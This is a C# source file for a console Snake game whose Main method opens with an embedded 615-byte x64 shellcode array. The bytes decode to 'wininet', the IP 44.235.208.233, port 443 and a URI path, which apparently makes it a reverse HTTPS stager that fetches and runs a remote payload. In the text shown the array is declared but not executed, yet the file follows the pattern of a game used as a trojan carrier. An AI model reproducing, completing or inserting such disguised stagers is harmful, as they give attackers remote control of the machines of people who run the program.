using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;


namespace SharpSnake
{
    //https://codereview.stackexchange.com/questions/210835/console-snake-game-in-c
    class Program
    {


        static readonly int gridW = 90;
        static readonly int gridH = 25;
        static Cell[,] grid = new Cell[gridH, gridW];
        static Cell currentCell;
        static Cell food;
        static int FoodCount;
        static int direction; //0=Up 1=Right 2=Down 3=Left
        static readonly int speed = 1;
        static bool Populated = false;
        static bool Lost = false;
        static int snakeLength;



        static void Main(string[] args)
        {
                byte[] shellcode = new byte[615] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
                0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
                0x41,0x51,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
                0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x44,
                0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
                0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
                0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
                0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
                0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
                0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
                0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
                0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
                0xe8,0x0f,0x00,0x00,0x00,0x34,0x34,0x2e,0x32,0x33,0x35,0x2e,0x32,0x30,0x38,
                0x2e,0x32,0x33,0x33,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,
                0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,
                0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x3d,0x00,0x00,0x00,0x2f,0x72,0x4b,0x71,
                0x55,0x79,0x4c,0x6c,0x6a,0x6f,0x36,0x4d,0x39,0x4f,0x54,0x77,0x37,0x58,0x32,
                0x79,0x56,0x41,0x77,0x41,0x51,0x5a,0x4d,0x59,0x6e,0x42,0x53,0x50,0x5f,0x69,
                0x56,0x69,0x42,0x61,0x54,0x38,0x73,0x6a,0x62,0x56,0x64,0x64,0x57,0x56,0x4a,
                0x34,0x72,0x73,0x4d,0x65,0x68,0x4e,0x56,0x55,0x69,0x2d,0x00,0x48,0x89,0xc1,
                0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,
                0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,
                0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,
                0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,
                0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,
                0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,
                0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,
                0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,
                0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,
                0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,
                0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,
                0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,
                0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,
                0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,
                0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };



            Console.Clear();
            string banner = @"
          ________.__                         _________              __           
         /   _____|  |__ _____ _____________ /   _____/ ____ _____  |  | __ ____  
         \_____  \|  |  \\__  \\_  __ \____ \\_____  \ /    \\__  \ |  |/ _/ __ \ 
         /        |   Y  \/ __ \|  | \|  |_> /        |   |  \/ __ \|    <\  ___/ 
        /_______  |___|  (____  |__|  |   __/_______  |___|  (____  |__|_ \\___  >
                \/     \/     \/      |__|          \/     \/     \/     \/    \/ 
        ";

            Console.WriteLine(banner);
            Console.WriteLine("Loading...");
            Thread.Sleep(3000);

            if (!Populated)
            {
                FoodCount = 0;
                snakeLength = 5;
                populateGrid(); 
                 currentCell = grid[(int)Math.Ceiling((double)gridH / 2), (int)Math.Ceiling((double)gridW / 2)];
                updatePos();
                addFood();
                Populated = true;
            }

            while (!Lost)
            {
                Restart();
            }
        }

        static void Restart()
        {
            Console.SetCursorPosition(0, 0);
            printGrid();
            Console.WriteLine("Length: {0}", snakeLength);
            getInput();
        }

        static void updateScreen()
        {
            Console.SetCursorPosition(0, 0);
            printGrid();
            Console.WriteLine("Length: {0}", snakeLength);
        }

        static void getInput()
        {

            //Console.Write("Where to move? [WASD] ");
            ConsoleKeyInfo input;
            while (!Console.KeyAvailable)
            {
                Move();
                updateScreen();
            }
            input = Console.ReadKey();
            doInput(input.KeyChar);
        }

        static void checkCell(Cell cell)
        {
            if (cell.val == "%")
            {
                eatFood();
            }
            if (cell.visited)
            {
                Lose();
            }
        }

        static void Lose()
        {
            Console.WriteLine("\n You lose :(, Good bye !");
            Thread.Sleep(1000);
            //Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);
            Environment.Exit(-1);
        }

        static void doInput(char inp)
        {
            switch (inp)
            {
                case 'w':
                    goUp();
                    break;
                case 's':
                    goDown();
                    break;
                case 'a':
                    goRight();
                    break;
                case 'd':
                    goLeft();
                    break;
            }
        }

        static void addFood()
        {
            Random r = new Random();
            Cell cell;
            while (true)
            {
                cell = grid[r.Next(grid.GetLength(0)), r.Next(grid.GetLength(1))];
                if (cell.val == " ")
                    cell.val = "%";
                break;
            }
        }

        static void eatFood()
        {
            snakeLength += 1;
            addFood();
        }

        static void goUp()
        {
            if (direction == 2)
                return;
            direction = 0;
        }

        static void goRight()
        {
            if (direction == 3)
                return;
            direction = 1;
        }

        static void goDown()
        {
            if (direction == 0)
                return;
            direction = 2;
        }

        static void goLeft()
        {
            if (direction == 1)
                return;
            direction = 3;
        }

        static void Move()
        {
            if (direction == 0)
            {
                //up
                if (grid[currentCell.y - 1, currentCell.x].val == "*")
                {
                    Lose();
                    return;
                }
                visitCell(grid[currentCell.y - 1, currentCell.x]);
            }
            else if (direction == 1)
            {
                //right
                if (grid[currentCell.y, currentCell.x - 1].val == "*")
                {
                    Lose();
                    return;
                }
                visitCell(grid[currentCell.y, currentCell.x - 1]);
            }
            else if (direction == 2)
            {
                //down
                if (grid[currentCell.y + 1, currentCell.x].val == "*")
                {
                    Lose();
                    return;
                }
                visitCell(grid[currentCell.y + 1, currentCell.x]);
            }
            else if (direction == 3)
            {
                //left
                if (grid[currentCell.y, currentCell.x + 1].val == "*")
                {
                    Lose();
                    return;
                }
                visitCell(grid[currentCell.y, currentCell.x + 1]);
            }
            Thread.Sleep(speed * 100);
        }

        static void visitCell(Cell cell)
        {
            currentCell.val = "#";
            currentCell.visited = true;
            currentCell.decay = snakeLength;
            checkCell(cell);
            currentCell = cell;
            updatePos();

            //checkCell(currentCell);
        }

        static void updatePos()
        {

            currentCell.Set("@");
            if (direction == 0)
            {
                currentCell.val = "^";
            }
            else if (direction == 1)
            {
                currentCell.val = "<";
            }
            else if (direction == 2)
            {
                currentCell.val = "v";
            }
            else if (direction == 3)
            {
                currentCell.val = ">";
            }

            currentCell.visited = false;
            return;
        }

        static void populateGrid()
        {
            Random random = new Random();
            for (int col = 0; col < gridH; col++)
            {
                for (int row = 0; row < gridW; row++)
                {
                    Cell cell = new Cell();
                    cell.x = row;
                    cell.y = col;
                    cell.visited = false;
                    if (cell.x == 0 || cell.x > gridW - 2 || cell.y == 0 || cell.y > gridH - 2)
                        cell.Set("*");
                    else
                        cell.Clear();
                    grid[col, row] = cell;
                }
            }
        }

        static void printGrid()
        {
            string toPrint = "";
            for (int col = 0; col < gridH; col++)
            {
                for (int row = 0; row < gridW; row++)
                {
                    grid[col, row].decaySnake();
                    toPrint += grid[col, row].val;

                }
                toPrint += "\n";
            }
            Console.WriteLine(toPrint);
        }
        public class Cell
        {
            public string val
            {
                get;
                set;
            }
            public int x
            {
                get;
                set;
            }
            public int y
            {
                get;
                set;
            }
            public bool visited
            {
                get;
                set;
            }
            public int decay
            {
                get;
                set;
            }

            public void decaySnake()
            {
                decay -= 1;
                if (decay == 0)
                {
                    visited = false;
                    val = " ";
                }
            }

            public void Clear()
            {
                val = " ";
            }

            public void Set(string newVal)
            {
                val = newVal;
            }
        }
    }
}